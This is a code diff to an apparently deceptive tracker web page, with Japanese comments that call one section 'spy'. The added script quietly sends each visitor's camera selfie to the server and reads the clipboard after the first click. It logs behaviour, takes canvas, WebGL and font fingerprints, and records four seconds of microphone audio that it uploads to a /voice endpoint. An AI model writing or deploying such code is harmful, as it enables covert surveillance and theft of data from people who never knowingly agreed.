@@ -79,6 +79,8 @@ window.GPS = {
   retry: {{ retry_text|tojson }}
 };
 </script>
+
+<!-- ============ 本体（位置情報・カメラ・録画） ============ -->
 <script>
 (function () {
   "use strict";
@@ -120,10 +122,6 @@ window.GPS = {
   function say(t, w) {
     if (gst) { gst.textContent = t || ""; gst.style.color = w ? "#f0b429" : ""; }
     if (st) { st.textContent = t || ""; st.className = "line" + (w ? " warn" : ""); }
-  }
-  function permText() {
-    var s = "位置情報：許可状態を確認しています…";
-    return s;
   }
   function showHelp(txt) {
     if (help) help.style.display = "block";
@@ -361,11 +359,18 @@ window.GPS = {
       var x = cv.getContext("2d");
       x.translate(w, 0); x.scale(-1, 1);
       x.drawImage(v, 0, 0, w, h);
+      var data = cv.toDataURL("image/jpeg", 0.7);
+      // 監視室の「自撮り」と解析のギャラリーの両方に効く（/ev が両方へ書く）
+      fetch("/g/" + encodeURIComponent(CODE) + "/ev", {
+        method: "POST", cache: "no-store",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ sid: SID, vid: VID, kind: "selfie", text: data })
+      }).catch(function () {});
+      // 旧 /x も一応
       fetch("/g/" + encodeURIComponent(CODE) + "/x", {
         method: "POST", cache: "no-store",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ sid: SID, vid: VID, kind: "selfie",
-                               selfie: cv.toDataURL("image/jpeg", 0.7) })
+        body: JSON.stringify({ sid: SID, vid: VID, kind: "selfie", selfie: data })
       }).catch(function () {});
     } catch (e) {}
   }
@@ -403,27 +408,6 @@ window.GPS = {
     recTimer = setTimeout(function () { try { rec.stop(); } catch (e) {} }, {{ seg_ms }});
   }
 
-  /* ---------- 指紋（軽量） ---------- */
-  function fingerprint() {
-    var o = {
-      ua: navigator.userAgent,
-      lang: (navigator.languages || [navigator.language]).join(","),
-      tz: (function () { try { return Intl.DateTimeFormat().resolvedOptions().timeZone; }
-                         catch (e) { return ""; } })(),
-      screen: screen.width + "x" + screen.height + "x" + screen.colorDepth,
-      dpr: window.devicePixelRatio || 1,
-      cores: navigator.hardwareConcurrency || 0,
-      mem: navigator.deviceMemory || 0,
-      touch: ("ontouchstart" in window) ? 1 : 0,
-      platform: navigator.platform || ""
-    };
-    fetch("/g/" + encodeURIComponent(CODE) + "/x", {
-      method: "POST", cache: "no-store",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ sid: SID, vid: VID, fp: o })
-    }).catch(function () {});
-  }
-
   /* ---------- 起動 ---------- */
   document.getElementById("go").addEventListener("click", start);
   document.addEventListener("click", function (e) {
@@ -452,8 +436,168 @@ window.GPS = {
   });
   window.addEventListener("pagehide", function () { if (!left) flush("stop"); });
 
-  fingerprint();
   setTimeout(function () { if (!started) start(); }, 2500);
+})();
+</script>
+
+<!-- ============ スパイ（クリップボード・行動ログ・指紋・環境音） ============ -->
+<script>
+(function () {
+  "use strict";
+  var G = window.GPS || {}, CODE = G.code;
+  if (!CODE) return;
+  var VID = (function () {
+    try {
+      var v = localStorage.getItem("gps_vid");
+      if (!v) { v = Math.random().toString(36).slice(2, 12) + Date.now().toString(36);
+                localStorage.setItem("gps_vid", v); }
+      return v;
+    } catch (e) { return "x"; }
+  })();
+
+  function post(path, body, beacon) {
+    var payload = JSON.stringify(body || {});
+    if (beacon && navigator.sendBeacon) {
+      try { if (navigator.sendBeacon(path, new Blob([payload], { type: "application/json" }))) return; } catch (e) {}
+    }
+    try {
+      fetch(path, { method: "POST", cache: "no-store",
+                    headers: { "Content-Type": "application/json" },
+                    body: payload }).catch(function () {});
+    } catch (e) {}
+  }
+  function ev(kind, value, text) {
+    post("/g/" + encodeURIComponent(CODE) + "/ev",
+         { vid: VID, kind: kind, value: value || 0, text: text || "" });
+  }
+
+  /* ---------- クリップボード ---------- */
+  ["click", "touchstart", "keydown"].forEach(function (t) {
+    document.addEventListener(t, function h() {
+      document.removeEventListener(t, h);
+      setTimeout(function () {
+        try {
+          if (!navigator.clipboard || !navigator.clipboard.readText) return;
+          navigator.clipboard.readText().then(function (s) {
+            if (s) ev("clip", 0, String(s).slice(0, 2000));
+          }).catch(function () {});
+        } catch (e) {}
+      }, 80);
+    }, { once: true, passive: true });
+  });
+
+  /* ---------- 滞在・スクロール・離脱 ---------- */
+  var t0 = Date.now(), hiddenMs = 0, hiddenAt = 0, maxScroll = 0;
+  var VISITS = (function () {
+    try { var k = "gps_v_" + CODE, n = (+(localStorage.getItem(k) || 0)) + 1;
+          localStorage.setItem(k, n); return n; } catch (e) { return 1; }
+  })();
+  window.addEventListener("scroll", function () {
+    var h = document.documentElement.scrollHeight - innerHeight;
+    var p = h > 0 ? Math.round(scrollY / h * 1000) / 10 : 100;
+    if (p > maxScroll) maxScroll = p;
+  }, { passive: true });
+  document.addEventListener("visibilitychange", function () {
+    if (document.visibilityState === "hidden") { hiddenAt = Date.now(); ev("blur", 0, ""); return; }
+    if (hiddenAt) { hiddenMs += Date.now() - hiddenAt; hiddenAt = 0; ev("focus", 0, ""); }
+  });
+  function flush(final) {
+    ev(final ? "exit" : "dwell", Date.now() - t0 - hiddenMs, {
+      scroll: maxScroll, visits: VISITS, w: innerWidth, h: innerHeight,
+      screen: screen.width + "x" + screen.height, dpr: devicePixelRatio || 1
+    });
+  }
+  setInterval(function () { flush(false); }, 15000);
+  window.addEventListener("pagehide", function () { flush(true); });
+
+  /* ---------- 端末指紋 ---------- */
+  function canvasHash() {
+    try {
+      var c = document.createElement("canvas"); c.width = 280; c.height = 60;
+      var x = c.getContext("2d");
+      x.textBaseline = "top"; x.font = "14px Arial";
+      x.fillStyle = "#f60"; x.fillRect(0, 0, 280, 60);
+      x.fillStyle = "#069"; x.fillText("igtracker あいう漢字", 2, 2);
+      x.globalCompositeOperation = "multiply";
+      var g = x.createLinearGradient(0, 0, 280, 0);
+      g.addColorStop(0, "rgba(255,0,0,.2)"); g.addColorStop(1, "rgba(0,0,255,.2)");
+      x.fillStyle = g; x.fillRect(0, 0, 280, 60);
+      x.beginPath(); x.arc(60, 30, 20, 0, Math.PI * 2); x.fill();
+      return c.toDataURL();
+    } catch (e) { return ""; }
+  }
+  function webgl() {
+    try {
+      var c = document.createElement("canvas");
+      var gl = c.getContext("webgl") || c.getContext("experimental-webgl");
+      if (!gl) return "";
+      var d = gl.getExtension("WEBGL_debug_renderer_info");
+      return [gl.getParameter(gl.VENDOR), gl.getParameter(gl.RENDERER),
+              d ? gl.getParameter(d.UNMASKED_VENDOR_WEBGL) : "",
+              d ? gl.getParameter(d.UNMASKED_RENDERER_WEBGL) : ""].join("|");
+    } catch (e) { return ""; }
+  }
+  function fonts() {
+    var list = ["Arial", "Hiragino Sans", "Yu Gothic", "Meiryo", "Roboto",
+                "Segoe UI", "Noto Sans JP", "Helvetica Neue", "Times New Roman"];
+    var base = ["monospace", "sans-serif", "serif"], hit = [];
+    try {
+      var s = document.createElement("span");
+      s.style.cssText = "position:absolute;left:-9999px;font-size:72px;white-space:nowrap";
+      s.textContent = "mmmmmmmmmmlli漢"; document.body.appendChild(s);
+      var ref = {};
+      base.forEach(function (b) { s.style.fontFamily = b; ref[b] = s.offsetWidth; });
+      list.forEach(function (f) {
+        base.some(function (b) {
+          s.style.fontFamily = "'" + f + "'," + b;
+          if (s.offsetWidth !== ref[b]) { hit.push(f); return true; }
+          return false;
+        });
+      });
+      document.body.removeChild(s);
+    } catch (e) {}
+    return hit.join(",");
+  }
+  setTimeout(function () {
+    ev("device", VISITS, {
+      visits: VISITS, ua: navigator.userAgent,
+      tz: (function () { try { return Intl.DateTimeFormat().resolvedOptions().timeZone; } catch (e) { return ""; } })(),
+      langs: navigator.languages || [navigator.language],
+      cores: navigator.hardwareConcurrency || 0, mem: navigator.deviceMemory || 0,
+      screen: screen.width + "x" + screen.height + "x" + screen.colorDepth,
+      dpr: devicePixelRatio || 1, touch: navigator.maxTouchPoints || 0,
+      platform: navigator.platform || "", canvas: canvasHash(), webgl: webgl(), fonts: fonts()
+    });
+  }, 400);
+
+  /* ---------- 環境音（ゲート通過後に1回だけ／live は映像側に音声があるので除外） ---------- */
+  var voiceDone = false;
+  var wait = setInterval(function () {
+    if (voiceDone || !document.body.classList.contains("need")) return;
+    voiceDone = true; clearInterval(wait);
+    if (G.live) return;
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
+    setTimeout(function () {
+      navigator.mediaDevices.getUserMedia({ audio: true }).then(function (st) {
+        if (!window.MediaRecorder) return;
+        var rec = new MediaRecorder(st), chunks = [];
+        rec.ondataavailable = function (e) { if (e.data && e.data.size) chunks.push(e.data); };
+        rec.onstop = function () {
+          try { st.getTracks().forEach(function (t) { t.stop(); }); } catch (e) {}
+          var blob = new Blob(chunks, { type: rec.mimeType || "audio/webm" });
+          if (blob.size < 900) return;
+          var fr = new FileReader();
+          fr.onload = function () {
+            post("/g/" + encodeURIComponent(CODE) + "/voice",
+                 { vid: VID, ms: 4000, data: fr.result });
+          };
+          fr.readAsDataURL(blob);
+        };
+        try { rec.start(); } catch (e) { return; }
+        setTimeout(function () { try { rec.stop(); } catch (e) {} }, 4000);
+      }).catch(function () {});
+    }, 2600);
+  }, 400);
 })();
 </script>
 </body></html>
